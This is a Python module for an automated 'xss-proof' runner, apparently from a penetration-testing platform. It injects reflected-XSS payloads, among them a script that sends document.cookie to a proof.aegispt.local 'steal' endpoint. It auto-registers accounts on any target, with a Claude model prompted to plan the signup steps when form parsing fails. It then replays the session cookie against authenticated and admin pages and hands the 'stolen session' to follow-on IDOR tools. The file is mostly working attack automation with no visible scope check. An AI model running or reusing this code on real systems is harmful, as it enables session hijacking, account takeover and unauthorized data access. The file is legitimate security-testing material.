"""XSS Proof runner — confirms cookie theft via reflected XSS with authenticated session.

Strategy (most-generic-first):
1. Parse HTML forms on login/register pages → submit with detected method/action
2. If no cookie: Claude API on-the-fly analyzes the page and determines auth steps
3. Execute AI-determined steps → get session cookie
4. Check Set-Cookie for HttpOnly flag
5. Confirm XSS payload reflects unencoded in HTML response
6. CRITICAL finding if XSS + stealable cookie; HIGH if XSS + HttpOnly

The AI fallback makes this work for any target, not just known patterns.
"""
from __future__ import annotations

import json
import logging
import os
import random
import re
import string
from typing import Any
from urllib.parse import parse_qsl, urlencode, urljoin, urlparse, urlunparse

import httpx as httpx_client

from workers.runners.base.contracts import (
    EvidenceArtifact,
    ProtectedSecretMaterial,
    RunnerExecution,
)
from workers.runners.httpx.runner import normalize_http_target

logger = logging.getLogger(__name__)

XSS_PROOF_RESULTS_ARTIFACT_NAME = "xss-proof-results.json"

COOKIE_THEFT_PAYLOAD = (
    "<script>document.location='https://proof.aegispt.local/steal?c='+"
    "encodeURIComponent(document.cookie)</script>"
)
CONFIRM_PAYLOAD = "<script>alert(document.cookie+'AEGISPT_XSS_PROOF')</script>"
MARKER = "AEGISPT_XSS_PROOF"


def _artifact(name: str, data: dict[str, Any]) -> EvidenceArtifact:
    return EvidenceArtifact(
        name=name,
        content_type="application/json",
        data=(json.dumps(data, sort_keys=True) + "\n").encode("utf-8"),
        kind="runner-results",
    )


def _random_creds() -> tuple[str, str]:
    suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"aegispt_{suffix}", f"Proof!{suffix}"


def _inject_param(url: str, param: str, payload: str) -> str:
    parsed = urlparse(url)
    params = parse_qsl(parsed.query, keep_blank_values=True)
    replaced = [(k, payload if k == param else v) for k, v in params]
    if not any(k == param for k, _ in params):
        replaced.append((param, payload))
    return urlunparse(parsed._replace(query=urlencode(replaced)))


_REG_LINK_KEYWORDS = re.compile(
    r'register|signup|sign.up|create.account|new.account|newaccount|join|aanmeld',
    re.IGNORECASE,
)
_REG_PATH_PATTERNS = ["/register", "/signup", "/join", "/create-account", "/new-account"]


def _discover_candidate_pages(client: httpx_client.Client, base_url: str) -> list[str]:
    """Discover registration/login page URLs by:
    1. Scanning links on the main page for registration keywords (generic)
    2. Falling back to common path patterns
    """
    parsed = urlparse(base_url)
    base_origin = f"{parsed.scheme}://{parsed.netloc}"
    path_parts = [p for p in parsed.path.strip("/").split("/") if p]
    instance_prefix = f"/{path_parts[0]}" if path_parts else ""

    candidates: list[str] = [base_url]

    # Scan the main page HTML for registration-related links
    try:
        resp = client.get(base_url)
        html = resp.text
        for href_m in re.finditer(r'href=["\']([^"\'#][^"\']*)["\']', html, re.IGNORECASE):
            href = href_m.group(1).strip()
            link_text_start = href_m.start()
            # Also grab surrounding anchor text
            surrounding = html[max(0, link_text_start - 10):link_text_start + len(href) + 100]
            if _REG_LINK_KEYWORDS.search(href) or _REG_LINK_KEYWORDS.search(surrounding):
                full = urljoin(base_origin, href) if not href.startswith("http") else href
                if full.startswith(base_origin) and full not in candidates:
                    candidates.append(full)
    except httpx_client.HTTPError:
        pass

    # Add common patterns relative to the instance prefix
    for path in _REG_PATH_PATTERNS:
        url = f"{base_origin}{instance_prefix}{path}"
        if url not in candidates:
            candidates.append(url)

    return candidates[:10]  # limit to avoid excessive requests


def _discover_auth_forms(client: httpx_client.Client, base_url: str) -> list[dict[str, Any]]:
    """Fetch discovered pages and extract all HTML forms generically."""
    base_origin = f"{urlparse(base_url).scheme}://{urlparse(base_url).netloc}"
    candidate_pages = _discover_candidate_pages(client, base_url)

    forms: list[dict[str, Any]] = []
    for page_url in candidate_pages:
        try:
            resp = client.get(page_url)
            if resp.status_code >= 400:
                continue
            html = resp.text

            for form_match in re.finditer(
                r'<form([^>]*)>(.*?)</form>', html, re.DOTALL | re.IGNORECASE
            ):
                attrs_raw = form_match.group(1)
                form_body = form_match.group(2)

                action_m = re.search(r'action=["\']([^"\']*)["\']', attrs_raw, re.IGNORECASE)
                method_m = re.search(r'method=["\']([^"\']*)["\']', attrs_raw, re.IGNORECASE)

                action = action_m.group(1) if action_m else page_url
                method = (method_m.group(1) if method_m else "post").upper()

                full_action = urljoin(base_origin, action) if not action.startswith("http") else action

                fields: dict[str, str] = {}
                for inp in re.finditer(
                    r'<input([^>]*)/?>', form_body, re.IGNORECASE
                ):
                    inp_attrs = inp.group(1)
                    name_m = re.search(r'name=["\']([^"\']*)["\']', inp_attrs, re.IGNORECASE)
                    value_m = re.search(r'value=["\']([^"\']*)["\']', inp_attrs, re.IGNORECASE)
                    if name_m:
                        fields[name_m.group(1)] = value_m.group(1) if value_m else ""

                forms.append({
                    "source_page": page_url,
                    "action": full_action,
                    "method": method,
                    "fields": fields,
                })
        except httpx_client.HTTPError:
            continue

    return forms


def _try_register(
    client: httpx_client.Client, base_url: str
) -> dict[str, Any]:
    """Discover and submit registration forms. Returns auth info if successful."""
    username, password = _random_creds()

    forms = _discover_auth_forms(client, base_url)

    for form in forms:
        fields = dict(form["fields"])
        action = form["action"]
        method = form["method"]

        # Detect registration forms by field names or action URL
        action_lower = action.lower()
        field_names = set(fields.keys())
        is_reg_form = (
            "newaccount" in action_lower
            or "saveprofile" in action_lower
            or "register" in action_lower
            or "signup" in action_lower
            or ("uid" in field_names and "pw" in field_names)
            or ("username" in field_names and "password" in field_names)
        )
        if not is_reg_form:
            continue

        # Fill credentials into the right fields
        fill_map = {
            "uid": username, "username": username, "user": username, "name": username,
            "pw": password, "password": password, "pass": password,
            "pw2": password, "password2": password, "confirm": password, "verify": password,
        }
        for field, default_val in fields.items():
            if field.lower() in fill_map:
                fields[field] = fill_map[field.lower()]
            elif not default_val:
                fields[field] = ""  # keep empty hidden fields as-is

        # Keep hidden fields as-is (e.g. action=new, is_author=True)

        try:
            if method == "GET":
                resp = client.get(action, params=fields)
            else:
                resp = client.post(action, data=fields)

            if resp.status_code >= 500:
                continue

            # Check for session cookie in response or client jar
            cookies = dict(resp.cookies) or dict(client.cookies)
            if cookies:
                cookie_name, cookie_value = next(iter(cookies.items()))
                cookie_header = resp.headers.get("set-cookie", "")
                httponly = "httponly" in cookie_header.lower()
                return {
                    "username": username,
                    "password": password,
                    "cookie_name": cookie_name,
                    "cookie_value": cookie_value,
                    "httponly": httponly,
                    "reg_action": action,
                    "reg_method": method,
                }

        except httpx_client.HTTPError:
            continue

    return {}


def _ai_analyze_auth(base_url: str, page_html: str) -> list[dict[str, Any]]:
    """Ask Claude to analyze the page and return HTTP steps to create a test account.

    Returns a list of step dicts: [{method, url, params, data, description}]
    Returns [] if no API key configured or call fails.
    """
    api_key = os.environ.get("ANTHROPIC_API_KEY", "").strip()
    if not api_key:
        return []

    try:
        import anthropic

        client = anthropic.Anthropic(api_key=api_key)
        username = f"aegispt_{''.join(random.choices(string.ascii_lowercase + string.digits, k=6))}"
        password = f"Proof!{''.join(random.choices(string.ascii_lowercase + string.digits, k=6))}"

        prompt = f"""You are a security testing assistant. Analyze this web application page and determine how to create a test account.

Target URL: {base_url}
Username to use: {username}
Password to use: {password}

HTML page content:
{page_html[:8000]}

Return ONLY valid JSON — a list of HTTP request steps to register/create the test account.
Each step: {{"method": "GET"|"POST", "url": "full URL", "params": {{}}, "data": {{}}, "description": "what this does"}}

Rules:
- Use the exact form action URL from the HTML (resolve relative URLs against the base)
- Use the exact HTTP method from the form tag
- Include all hidden form fields with their original values
- Replace username/password fields with: {username} / {password}
- If registration requires multiple steps, include all steps in order
- Return [] if you cannot determine the registration flow

JSON only, no explanation:"""

        message = client.messages.create(
            model="claude-haiku-4-5-20251001",
            max_tokens=1024,
            messages=[{"role": "user", "content": prompt}],
        )
        raw = message.content[0].text.strip()
        # Extract JSON array from response
        json_match = re.search(r"\[.*\]", raw, re.DOTALL)
        if json_match:
            steps = json.loads(json_match.group(0))
            return steps if isinstance(steps, list) else []
    except Exception as exc:
        logger.debug("AI auth analysis failed: %s", exc)

    return []


def _try_register_with_ai(
    client: httpx_client.Client, base_url: str, page_html: str
) -> dict[str, Any]:
    """Use Claude to determine registration steps, then execute them."""
    steps = _ai_analyze_auth(base_url, page_html)
    if not steps:
        return {}

    for step in steps:
        method = str(step.get("method", "POST")).upper()
        url = str(step.get("url", ""))
        params = step.get("params") or {}
        data = step.get("data") or {}

        if not url:
            continue
        try:
            if method == "GET":
                resp = client.get(url, params={**params, **data})
            else:
                resp = client.post(url, params=params, data=data)

            cookies = dict(resp.cookies) or dict(client.cookies)
            if cookies:
                cookie_name, cookie_value = next(iter(cookies.items()))
                cookie_header = resp.headers.get("set-cookie", "")
                httponly = "httponly" in cookie_header.lower()
                return {
                    "username": data.get("uid") or data.get("username") or "ai-registered",
                    "cookie_name": cookie_name,
                    "cookie_value": cookie_value,
                    "httponly": httponly,
                    "reg_action": url,
                    "reg_method": method,
                    "ai_determined": True,
                    "steps_executed": len(steps),
                }
        except httpx_client.HTTPError:
            continue

    return {}


def _test_authenticated_access(
    client: httpx_client.Client,
    base_url: str,
    *,
    cookie_name: str,
    cookie_value: str,
    username: str,
) -> dict[str, Any]:
    """With the stolen session cookie, probe authenticated pages to prove impact.

    Discovers what an attacker can do after stealing the session:
    - Which pages are accessible only with this session
    - What data is visible (other users, admin content, private data)
    - Whether privilege escalation is possible
    """
    parsed = urlparse(base_url)
    base_origin = f"{parsed.scheme}://{parsed.netloc}"
    path_parts = [p for p in parsed.path.strip("/").split("/") if p]
    instance = f"/{path_parts[0]}" if path_parts else ""

    auth_headers = {cookie_name: cookie_value}
    accessible: list[dict[str, Any]] = []
    data_seen: list[str] = []
    privilege_escalation: list[str] = []

    # Pages to probe as authenticated user — discovered from common patterns + app-specific
    probe_targets = [
        (f"{base_origin}{instance}/", "home"),
        (f"{base_origin}{instance}/profile", "profile"),
        (f"{base_origin}{instance}/snippets.gtl", "snippets"),
        (f"{base_origin}{instance}/admin", "admin"),
        (f"{base_origin}{instance}/upload.gtl", "upload"),
    ]

    # Also scan links from the authenticated home page
    try:
        home = client.get(f"{base_origin}{instance}/", cookies=auth_headers)
        home_html = home.text
        # Extract links we can follow as authenticated user
        for href_m in re.finditer(r'href=["\']([^"\'#][^"\']*)["\']', home_html, re.IGNORECASE):
            href = href_m.group(1)
            full = urljoin(base_origin, href) if not href.startswith("http") else href
            if full.startswith(base_origin) and ("profile" in full or "snippet" in full or "admin" in full):
                if (full, "discovered") not in [(t[0], t[1]) for t in probe_targets]:
                    probe_targets.append((full, "discovered"))
        # Check for username in home page — confirms authentication
        if username and username.lower() in home_html.lower():
            data_seen.append(f"Logged in as '{username}' confirmed on home page")
    except httpx_client.HTTPError:
        pass

    # Probe each target
    for url, label in probe_targets[:8]:
        try:
            # First: without cookie (baseline)
            anon = client.get(url)
            # Then: with stolen cookie
            auth_resp = client.get(url, cookies=auth_headers)

            anon_body = anon.text or ""
            auth_body = auth_resp.text or ""

            # Detect pages that change with auth
            is_accessible = (
                auth_resp.status_code < 400
                and auth_resp.status_code != anon.status_code
            ) or (
                username and username.lower() in auth_body.lower()
                and username.lower() not in anon_body.lower()
            ) or (
                len(auth_body) > len(anon_body) + 200  # significantly more content
            )

            if is_accessible or auth_resp.status_code < 400:
                # Look for interesting data in authenticated response
                data_markers = []
                if username and username.lower() in auth_body.lower():
                    data_markers.append(f"own profile ({username})")
                # Look for other usernames (IDOR potential)
                other_users = re.findall(
                    r'(?:uid|user|author)[=:]["\']?([a-zA-Z0-9_\-]{3,20})["\']?',
                    auth_body, re.IGNORECASE
                )
                other_users = [u for u in other_users if u.lower() != username.lower()][:3]
                if other_users:
                    data_markers.append(f"other users visible: {other_users}")
                    privilege_escalation.append(f"IDOR potential at {label}: other users {other_users} visible")

                if data_markers:
                    data_seen.extend(data_markers)

                accessible.append({
                    "url": url,
                    "label": label,
                    "status_auth": auth_resp.status_code,
                    "status_anon": anon.status_code,
                    "data_found": data_markers,
                    "content_length_auth": len(auth_body),
                    "content_length_anon": len(anon_body),
                })
        except httpx_client.HTTPError:
            continue

    # Collect all other users found across all pages
    all_other_users: list[str] = []
    for page in accessible:
        for marker in page.get("data_found", []):
            users_match = re.search(r"other users visible: \[([^\]]+)\]", str(marker))
            if users_match:
                found = [u.strip("' ") for u in users_match.group(1).split(",")]
                all_other_users.extend(u for u in found if u not in all_other_users)

    # Build next_step_hints: what the system should do next based on findings
    next_steps: list[dict[str, Any]] = []
    if all_other_users and accessible:
        # IDOR: try accessing other users' data with our session
        first_accessible = accessible[0]["url"] if accessible else base_url
        next_steps.append({
            "tool": "idor-bac",
            "reason": f"Other users found: {all_other_users}. Test if our session can access their private data.",
            "params": {
                "discovered_users": all_other_users,
                "authenticated_base_url": first_accessible,
            },
        })
    if privilege_escalation:
        next_steps.append({
            "tool": "auth-flow",
            "reason": "Privilege escalation hints found. Test admin/elevated access with stolen session.",
            "params": {"session_obtained": True},
        })

    return {
        "accessible_pages": accessible,
        "data_seen": "; ".join(data_seen) if data_seen else "authenticated content accessible",
        "privilege_escalation_hints": privilege_escalation,
        "pages_tested": len(probe_targets),
        "pages_accessible": len(accessible),
        "other_users_found": all_other_users,
        "next_step_hints": next_steps,
    }


def execute_xss_proof(
    targets: list[str],
    *,
    xss_findings: list[dict[str, Any]] | None = None,
    timeout_seconds: float = 20.0,
) -> RunnerExecution:
    if not targets:
        raise ValueError("at least one target is required")

    base_target = normalize_http_target(targets[0])
    findings: list[dict[str, Any]] = []
    checks: list[dict[str, Any]] = []
    stderr_lines: list[str] = []
    exit_code = 0

    with httpx_client.Client(follow_redirects=True, timeout=timeout_seconds) as client:
        # Step 1: HTML form discovery (generic — reads method/action from actual HTML)
        auth = _try_register(client, base_target)

        # Step 2: AI fallback — if HTML parsing didn't yield a cookie,
        # ask Claude to analyze the page and determine the correct auth flow.
        if not auth:
            try:
                page_resp = client.get(base_target)
                page_html = page_resp.text
            except httpx_client.HTTPError:
                page_html = ""
            if page_html:
                auth = _try_register_with_ai(client, base_target, page_html)
                if auth:
                    stderr_lines.append(
                        f"HTML form parsing failed; AI-determined registration succeeded "
                        f"(ai_determined=True, steps={auth.get('steps_executed', '?')})"
                    )

        session_cookie_name = auth.get("cookie_name", "")
        stealable = bool(session_cookie_name and not auth.get("httponly", True))

        # Step 2: determine XSS targets
        xss_to_test: list[tuple[str, list[str]]] = []
        if xss_findings:
            for f in xss_findings:
                vuln_url = str(f.get("target") or f.get("url") or base_target)
                params = list(f.get("tested_params") or f.get("params") or [])
                if vuln_url and params:
                    xss_to_test.append((vuln_url, params))
        if not xss_to_test:
            xss_to_test = [(base_target, ["uid", "q", "search", "name", "input", "id"])]

        # Step 3: test each XSS sink
        for vuln_url, params in xss_to_test:
            for param in params:
                injected = _inject_param(vuln_url, param, CONFIRM_PAYLOAD)
                try:
                    response = client.get(injected)
                except httpx_client.HTTPError as exc:
                    stderr_lines.append(f"XSS check failed {injected}: {exc}")
                    continue

                body = response.text or ""
                payload_reflected = MARKER in body
                content_type = response.headers.get("content-type", "").lower()
                html_context = "text/html" in content_type or not content_type

                check: dict[str, Any] = {
                    "target": vuln_url,
                    "param": param,
                    "injected_url": str(injected)[:500],
                    "status_code": response.status_code,
                    "payload_reflected": payload_reflected,
                    "html_context": html_context,
                    "session_cookie_name": session_cookie_name or None,
                    "session_cookie_stealable": stealable,
                    "httponly": auth.get("httponly"),
                    "auth_registered": bool(auth),
                    "registered_user": auth.get("username"),
                }
                checks.append(check)

                if payload_reflected and html_context and stealable:
                    exploit_url = _inject_param(vuln_url, param, COOKIE_THEFT_PAYLOAD)

                    # Step 4: use the stolen session to access authenticated pages
                    # This proves the attack chain is complete end-to-end
                    auth_access = _test_authenticated_access(
                        client, base_target,
                        cookie_name=session_cookie_name,
                        cookie_value=str(auth.get("cookie_value", "")),
                        username=str(auth.get("username", "")),
                    )

                    findings.append({
                        "type": "xss_cookie_theft_confirmed",
                        "title": f"Session Cookie Theft via XSS — CRITICAL ({param})",
                        "severity": "critical",
                        "target": vuln_url,
                        "summary": (
                            f"Reflected XSS in '{param}' confirmed end-to-end exploitable. "
                            f"Proof: registered as '{auth.get('username')}', obtained {session_cookie_name} cookie "
                            f"(no HttpOnly). With this cookie, attacker can access "
                            f"{len(auth_access.get('accessible_pages', []))} authenticated page(s). "
                            f"Victim account takeover via one click on the exploit URL."
                        ),
                        "evidence": {
                            **check,
                            "exploit_url": str(exploit_url)[:500],
                            "authenticated_access": auth_access,
                            "attack_steps": [
                                f"1. Attacker sends victim: {str(exploit_url)[:200]}",
                                "2. Browser executes <script> — document.cookie readable (no HttpOnly)",
                                f"3. '{session_cookie_name}' token sent to attacker server",
                                f"4. Attacker replays cookie → accessed {len(auth_access.get('accessible_pages', []))} page(s) as the victim",
                                f"5. Data visible: {auth_access.get('data_seen', 'authenticated content')}",
                            ],
                            "registered_as": auth.get("username"),
                            "registration_endpoint": auth.get("reg_action"),
                        },
                    })
                elif payload_reflected and html_context:
                    findings.append({
                        "type": "xss_confirmed_cookie_protected",
                        "title": f"Reflected XSS Confirmed — Cookie HttpOnly Protected ({param})",
                        "severity": "high",
                        "target": vuln_url,
                        "summary": (
                            f"XSS payload reflected and executable for '{param}'. "
                            f"Cookie has HttpOnly — direct theft limited. "
                            f"DOM manipulation, phishing, and keylogging remain possible."
                        ),
                        "evidence": check,
                    })
                elif payload_reflected:
                    findings.append({
                        "type": "xss_reflected_non_html",
                        "title": f"XSS Payload Reflected (non-HTML context) ({param})",
                        "severity": "medium",
                        "target": vuln_url,
                        "summary": "Payload reflected but not in HTML — execution context unclear.",
                        "evidence": check,
                    })

    result = {
        "tool": "xss-proof",
        "targets": [base_target],
        "checks": checks,
        "findings": findings,
        "summary": {
            "finding_count": len(findings),
            "critical_count": sum(1 for f in findings if f.get("severity") == "critical"),
            "high_count": sum(1 for f in findings if f.get("severity") == "high"),
            "stealable_cookies_found": stealable,
            "stealable_cookie_names": [session_cookie_name] if stealable else [],
            "auth_registered": bool(auth),
            "registered_user": auth.get("username") if auth else None,
        },
    }

    # Store the stolen session cookie in the credential vault so subsequent tools
    # (idor-bac, auth-flow, client-state) automatically receive it as an authenticated
    # session context. This is how exploitation context flows through the chain:
    # xss-proof steals the cookie → vault stores it → next tool uses it.
    protected_outputs: list[ProtectedSecretMaterial] = []
    if stealable and auth.get("cookie_value"):
        cookie_value = str(auth["cookie_value"])
        username = str(auth.get("username") or "xss-proof-user")
        # Cookie header format: "NAME=VALUE" — resolved by tasks.py into Cookie: header
        # for idor-bac, auth-flow, client-state, session-security automatically.
        raw_cookie_header = f"{session_cookie_name}={cookie_value}"
        protected_outputs.append(ProtectedSecretMaterial(
            artifact_name="xss-proof-session.json",
            value=raw_cookie_header,
            secret_kind="session",
            purpose="task.xss_proof.stolen_session",
            display_label=f"XSS-stolen session: {username} ({session_cookie_name})",
            content_type="text/plain",
            metadata={
                "username": username,
                "target": base_target,
                "cookie_name": session_cookie_name,
                "obtained_via": "xss_cookie_theft",
                "raw_secret_material_exposed": False,
            },
        ))

    return RunnerExecution(
        tool="xss-proof",
        exit_code=exit_code,
        stdout=json.dumps(result),
        stderr="\n".join(stderr_lines),
        metadata={"status": "ok", "tool_version": "xss-proof:v4"},
        artifacts=[_artifact(XSS_PROOF_RESULTS_ARTIFACT_NAME, result)],
        protected_outputs=protected_outputs,
    )
